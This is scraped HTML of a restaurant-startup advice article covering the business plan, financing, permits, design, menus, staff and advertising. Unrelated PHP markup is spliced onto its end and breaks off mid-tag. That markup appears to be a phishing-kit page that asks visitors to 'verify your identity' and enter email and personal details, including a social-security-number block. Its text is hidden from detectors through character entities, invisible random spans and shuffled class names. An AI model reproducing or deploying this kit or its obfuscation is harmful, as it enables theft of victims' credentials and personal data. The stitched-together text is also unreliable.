<div id="mntl-sc-block_1-0-11" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"><div id="mntl-block_4-0" class="comp mntl-block">
<div id="billboard3-sticky-dynamic_1-0" class="comp scads-to-load right-rail__item billboard-sticky billboard3-sticky-dynamic billboard-sticky--sc scads-stick-in-parent scads-ad-placed" data-height="600" style="top: 1984px;">
<div class="spacer">
<div id="billboard3-dynamic_1-0" class="comp billboard3-dynamic mntl-gpt-dynamic-adunit mntl-gpt-adunit gpt billboard dynamic" style="">
<div id="billboard3" class="wrapper" data-type="billboard" data-pos="btf2" data-priority="5" data-sizes="[[300, 250], [300, 252], [3, 1], &quot;fluid&quot;]" data-rtb="true" data-targeting="null" data-auction-floor-id="33d99ae4cb6940b0b67ff5e22c3822a4" data-auction-floor-value="10"><div id="google_ads_iframe_/479/thebalancesmb/balsmb_restaurants/billboard3_0__container__" style="border: 0pt none; width: 300px; height: 250px;"></div></div>
</div>
</div>
</div>
</div></div>
<p id="mntl-sc-block_1-0-13" class="comp text-passage mntl-sc-block mntl-sc-block-html">
The most enjoyable part of opening a new restaurant can be selecting a restaurant name that means something to you. It can be a family name, a play on words, another meaningful turn of phrase, or it can reflect the theme or location you chose, such as Broadway Diner or The Highlands.
</p>
<div id="mntl-sc-block_1-0-14" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"><div id="mntl-block_5-0" class="comp mntl-block">
<div id="native-placeholder_2-0" class="comp native-placeholder mntl-block"></div>
<div id="native_2-0" class="comp scads-to-load native mntl-gpt-dynamic-adunit mntl-gpt-adunit gpt dynamic scads-ad-placed" style="">
<div id="native" class="wrapper" data-type="native" data-pos="native" data-priority="4" data-sizes="[[1,3], &quot;fluid&quot;]" data-rtb="true" data-targeting="{}"><div id="google_ads_iframe_/479/thebalancesmb/balsmb_restaurants/native_0__container__" style="border: 0pt none; width: 1px; height: 3px;"></div></div>
</div>
</div></div>
<a class="heading-toc" id="business-plan"></a> <h2 id="mntl-sc-block_1-0-15" class="comp mntl-sc-block money-sc-block-heading mntl-sc-block-heading"> <span class="mntl-sc-block-heading__text"> Business Plan </span> </h2>
<p id="mntl-sc-block_1-0-17" class="comp text-passage mntl-sc-block mntl-sc-block-html">
The two most important reasons you need a restaurant <a href="https://www.thebalancesmb.com/how-to-write-a-restaurant-business-plan-2888455" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="1">business plan</a>. One, it helps you see potential problems in your restaurant plan, such as not enough of a <a href="https://www.thebalancesmb.com/how-to-find-out-the-population-base-of-an-area-2888660" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="2">population base</a>. Two, it's virtually impossible to get financing without one.
</p>
<div id="mntl-sc-block_1-0-18" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"><div id="mntl-block_6-0" class="comp mntl-block">
<div id="billboard4-sticky-dynamic_2-0" class="comp scads-to-load right-rail__item billboard-sticky billboard4-sticky-dynamic billboard-sticky--sc is-hidden" data-height="600">
<div class="spacer">
<div id="billboard4-dynamic_2-0" class="comp billboard4-dynamic mntl-gpt-dynamic-adunit mntl-gpt-adunit gpt billboard dynamic">
<div id="billboard4" class="wrapper" data-type="billboard" data-pos="btf3" data-priority="6" data-sizes="[[300, 250], [300, 253], [4, 1], &quot;fluid&quot;]" data-rtb="true" data-targeting="null" data-auction-floor-id="7d138dac2cd04f79b70ccf988cfa4880" data-auction-floor-value="15"></div>
</div>
</div>
</div>
</div></div>
<p id="mntl-sc-block_1-0-20" class="comp text-passage mntl-sc-block mntl-sc-block-html">
Financing is what prevents many from opening their own restaurant. Although it is somewhat more difficult to get financing for a restaurant, due to their higher failure rate than for some other business types, it is not impossible. Between banks, small business agencies, and private investors, there are several financing possibilities.
</p>
<div id="mntl-sc-block_1-0-21" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"><div id="mntl-block_7-0" class="comp mntl-block">
<div id="billboard5-sticky-dynamic_2-0" class="comp scads-to-load right-rail__item billboard-sticky billboard5-sticky-dynamic billboard-sticky--sc is-hidden" data-height="600">
<div class="spacer">
<div id="billboard5-dynamic_2-0" class="comp js-billboard-lazy billboard5-dynamic billboard-lazy mntl-lazy-ad mntl-gpt-dynamic-adunit mntl-gpt-adunit gpt billboard dynamic">
<div id="billboard5" class="wrapper" data-type="billboard" data-pos="btf4" data-priority="7" data-sizes="[[300, 250], [300, 254], [6, 1], &quot;fluid&quot;]" data-rtb="true" data-targeting="null" data-auction-floor-id="f74881159a694ed3a5ef4d7fdc098776" data-auction-floor-value="10"></div>
</div>
</div>
</div>
</div></div>
<p id="mntl-sc-block_1-0-23" class="comp text-passage mntl-sc-block mntl-sc-block-html">
Show up to your <a href="https://www.thebalancesmb.com/getting-ready-for-your-restaurant-loan-interview-2888445" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="1">financing interview</a>&nbsp;prepared, and show potential investors that you've thought through the mechanics of opening, running, and generating profit from a restaurant.
</p>
<div id="mntl-sc-block_1-0-24" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"><div id="mntl-block_8-0" class="comp mntl-block">
<div id="billboard6-sticky-dynamic_1-0" class="comp scads-to-load right-rail__item billboard-sticky billboard6-sticky-dynamic billboard-sticky--sc is-hidden" data-height="600">
<div class="spacer">
<div id="billboard6-dynamic_1-0" class="comp js-billboard-lazy billboard6-dynamic billboard-lazy mntl-lazy-ad mntl-gpt-dynamic-adunit mntl-gpt-adunit gpt billboard dynamic">
<div id="billboard6" class="wrapper" data-type="billboard" data-pos="btf5" data-priority="8" data-sizes="[[300, 250], [300, 255], [7, 1], &quot;fluid&quot;]" data-rtb="true" data-targeting="{}" data-auction-floor-id="ec3314ec6060403582b5d23c47cc7b18" data-auction-floor-value="25"></div>
</div>
</div>
</div>
</div></div>
<p id="mntl-sc-block_1-0-26" class="comp text-passage mntl-sc-block mntl-sc-block-html">
Common <a href="https://www.thebalancesmb.com/restaurant-insurance-basics-2888374" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="1">licenses</a> and permits&nbsp;for restaurants, regardless of the state, include liquor licenses, signage permits, separate permits for outdoor space, and workers' compensation. And remember, many licenses and permits take several weeks, even months, to be approved. So once your financing is squared away, start filling the paperwork.
</p>
<div id="mntl-sc-block_1-0-27" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"><div id="mntl-block_9-0" class="comp mntl-block">
<div id="billboard7-sticky-dynamic_1-0" class="comp scads-to-load right-rail__item billboard-sticky billboard7-sticky-dynamic billboard-sticky--sc is-hidden" data-height="600">
<div class="spacer">
<div id="billboard7-dynamic_1-0" class="comp js-billboard-lazy billboard7-dynamic billboard-lazy mntl-lazy-ad mntl-gpt-dynamic-adunit mntl-gpt-adunit gpt billboard dynamic">
<div id="billboard7" class="wrapper" data-type="billboard" data-pos="btf6" data-priority="9" data-sizes="[[300, 250], [300, 256], [8, 1], &quot;fluid&quot;]" data-rtb="true" data-targeting="{}" data-auction-floor-id="3ec6b5929951449792897c3d6c02ac1d" data-auction-floor-value="25"></div>
</div>
</div>
</div>
</div></div>
<a class="heading-toc" id="restaurant-design"></a> <h2 id="mntl-sc-block_1-0-28" class="comp mntl-sc-block money-sc-block-heading mntl-sc-block-heading"> <span class="mntl-sc-block-heading__text"> Restaurant Design </span> </h2>
<p id="mntl-sc-block_1-0-30" class="comp text-passage mntl-sc-block mntl-sc-block-html">
A common-sense rule about designing a restaurant is that you never have as much space as you first thought you did. Even the most cavernous of spaces fill&nbsp;up quickly when you start adding commercial kitchens, walk-in refrigerators, a bar, restrooms, and a waiting area. A <a href="https://www.thebalancesmb.com/restaurant-design-2888629" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="1">restaurant's design</a> should be a balance between aesthetics and seating capacity, keeping practicality in mind.
</p>
<div id="mntl-sc-block_1-0-31" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"></div>
<div id="mntl-sc-block_1-0-32" class="comp mntl-sc-block money-sc-block-callout mntl-block">
<div id="mntl-sc-block_1-0-33" class="comp theme-experttiptip mntl-sc-block mntl-sc-block-callout mntl-block" data-tracking-id="mntl-sc-block-callout" data-tracking-container="true">
<div id="mntl-sc-block-callout-body_1-0-1" class="comp mntl-sc-block-callout-body mntl-text-block">
<p>Choosing the right color for your restaurant will help you establish a strong brand and help you establish a welcoming ambiance for customers.</p></div>
</div>
</div>
<a class="heading-toc" id="menus-equipment-and-staff"></a> <h2 id="mntl-sc-block_1-0-34" class="comp mntl-sc-block money-sc-block-heading mntl-sc-block-heading"> <span class="mntl-sc-block-heading__text"> Menus, Equipment, and Staff&nbsp; </span> </h2>
<p id="mntl-sc-block_1-0-36" class="comp text-passage mntl-sc-block mntl-sc-block-html">
A well-written <a href="https://www.thebalancesmb.com/how-to-choose-restaurant-menu-items-2888581" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="1">restaurant menu</a> should be descriptive, easy to read and have a clear, uncluttered layout. Also, it's better to use an attractive font and high-quality paper than muck it up with generic art found on the internet.
</p>
<div id="mntl-sc-block_1-0-37" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"></div>
<p id="mntl-sc-block_1-0-39" class="comp text-passage mntl-sc-block mntl-sc-block-html">
Once you have your restaurant design down, you can start purchasing commercial kitchen equipment and furniture for your dining room and other areas in the front of the house. To save money, consider buying used equipment from a reliable source.
</p>
<div id="mntl-sc-block_1-0-40" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"></div>
<p id="mntl-sc-block_1-0-42" class="comp text-passage mntl-sc-block mntl-sc-block-html">
Commercial equipment with the Energy Star&nbsp;logo can cost more at first but will pay for itself many times over, and it's better for the environment.
</p>
<div id="mntl-sc-block_1-0-43" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"></div>
<p id="mntl-sc-block_1-0-45" class="comp text-passage mntl-sc-block mntl-sc-block-html">
As you get closer to opening day, hire for both the kitchen and the floor. Kitchen staff, waitstaff, and bartenders are all integral parts of most any restaurant, and you want to hire the perfect person for each position.
</p>
<div id="mntl-sc-block_1-0-46" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"></div>
<p id="mntl-sc-block_1-0-48" class="comp text-passage mntl-sc-block mntl-sc-block-html">
If you can, hire people with experience in the foodservice industry, and if you're hiring a chef you don't know, don't be shy about asking to test-tasting their food first.
</p>
<div id="mntl-sc-block_1-0-49" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"></div>
<a class="heading-toc" id="advertising"></a> <h2 id="mntl-sc-block_1-0-50" class="comp mntl-sc-block money-sc-block-heading mntl-sc-block-heading"> <span class="mntl-sc-block-heading__text"> Advertising </span> </h2>
<p id="mntl-sc-block_1-0-52" class="comp text-passage mntl-sc-block mntl-sc-block-html">
Advertising is a must for most <a href="https://www.thebalancesmb.com/how-to-advertise-for-a-new-restaurant-2888568" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="1">new restaurants</a>. Today, you can supplement social media advertising such as Facebook, Twitter, and Instagram, with more traditional advertising, such as newspapers and radio ads, depending on your concept and the diners you want to reach.
</p>
<div id="mntl-sc-block_1-0-53" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"></div>
<div id="mntl-sc-block_1-0-54" class="comp mntl-sc-block money-sc-block-callout mntl-block">
<div id="mntl-sc-block_1-0-55" class="comp theme-experttiptip mntl-sc-block mntl-sc-block-callout mntl-block" data-tracking-id="mntl-sc-block-callout" data-tracking-container="true">
<div id="mntl-sc-block-callout-body_1-0-2" class="comp mntl-sc-block-callout-body mntl-text-block">
<p>Don’t overlook the power of a good website. People can't taste food online, but an aesthetically-pleasing web presence can entice diners.&nbsp;</p></div>
</div>
</div>
<div id="mntl-block_1-0" class="comp js-scads-inline-content mntl-block">








</div>
</div>
</div>
</div>
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> row">
                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> col-xs-12 col-md-6 col-md-offset-3 logoff" id="boxup" style="margin-top: 5em; display:none;">
                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui raised segment" style="max-width: 470px!important;">
                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> row">
                                        <div style="display:block;" id="emailtext" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> col-xs-10 col-xs-offset-1">
                                            <h3 style="display:block;" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> u-focus in-progress" tabindex="-1"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#86;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;</h3>
                                            <br>
                                            <h3 class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> u-focus in-progress" tabindex="-1" style="font-size: 18px; color: #dab70d;"><img src="./img/alert.gif" style="width: 17px;" ><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#89;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;&apos;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#113;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#112;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;&period;</h3>
                                        </div>
                                        <div style="display:none;" id="ssnotext" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> col-xs-10 col-xs-offset-1">
                                            <h3 class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> u-focus in-progress" tabindex="-1"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#69;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#112;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;&period;</h3>
                                            <br>
                                            <h3 class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> u-focus in-progress" tabindex="-1" style="font-size: 18px; color: #dab70d;"><img src="./img/alert.gif" style="width: 17px;" ><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#78;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;&colon;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#89;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#112;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#98;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#98;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo 